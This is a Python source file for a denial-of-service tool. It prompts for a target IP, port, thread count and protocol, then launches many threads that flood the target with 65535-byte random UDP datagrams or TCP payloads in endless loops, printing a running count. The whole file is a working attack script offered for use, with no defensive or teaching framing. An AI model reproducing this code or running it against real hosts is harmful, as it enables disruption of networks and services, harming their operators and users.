import threading
import random
import sys
import os
import socket
from colorama import init, Fore #you need to install colorama <3

init(autoreset=True)

def udp_flood(ip, port):
    num = 0
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp:
                udp.sendto(random._urandom(65535), (ip, port))
                num += 1
                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
        except socket.error as e:
            print(f" error: {e}", end='\r')
        except Exception as e:
            print(f" error: {e}", end='\r')

def tcp_flood(ip, port):
    num = 0
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp:
                tcp.connect((ip, port))
                tcp.send(random._urandom(65535))
                num += 1
                print(f" [{Fore.MAGENTA}+{Fore.RESET}] connections: {num}                    ", end='\r')
        except socket.error as e:
            print(f" error: {e}", end='\r')
        except Exception as e:
            print(f" error: {e}", end='\r')

def main():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        ip = input(f"\n [{Fore.MAGENTA}?{Fore.RESET}] target: ")
        port = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] port: "))
        threads = int(input(f" [{Fore.MAGENTA}?{Fore.RESET}] threads: "))
        protocol = input(f" [{Fore.MAGENTA}?{Fore.RESET}] protocol (tcp/udp): ").lower()
        #using size as value was useless because it still was 65500 (changed to 65535 <3)

        if not socket.inet_aton(ip): #shorten
            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid ip address")
            sys.exit(1)
        if not 0 <= port <= 65535: #shorten
            print(f" [{Fore.MAGENTA}!{Fore.RESET}] error: invalid port number, must be between 0 and 65535.")
            sys.exit(1)

    except Exception as e:
        print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")
        sys.exit()

    function = udp_flood if protocol == 'udp' else tcp_flood if protocol == 'tcp' else None
    if not function:
        print(f" [{Fore.MAGENTA}!{Fore.RESET}] protocol: invalid")
        sys.exit(1)

    for _ in range(threads):
        try:
            threading.Thread(target=function, args=(ip, port)).start()
        except Exception as e:
            print(f"\n [{Fore.MAGENTA}!{Fore.RESET}] error: {e}")

if __name__ == "__main__":
    main() #main thing
